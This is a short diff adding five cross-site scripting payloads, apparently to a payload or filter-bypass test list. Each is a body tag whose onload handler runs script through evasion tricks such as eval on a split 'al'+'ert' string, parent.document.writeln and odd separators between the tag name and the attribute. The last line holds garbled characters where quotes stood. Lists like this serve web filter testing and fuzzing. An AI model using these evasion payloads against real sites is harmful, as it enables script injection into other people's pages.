@@ -1,0 +1,5 @@
+<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
+<body onload=a1={x:this.parent.document};a1.x.writeln(1);>
+<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
+<body/s/onload=x={doc:parent.document};x.doc.writeln(1)
+<body/????$/onload=x={doc:parent[�document�]};x.doc.writeln(1)
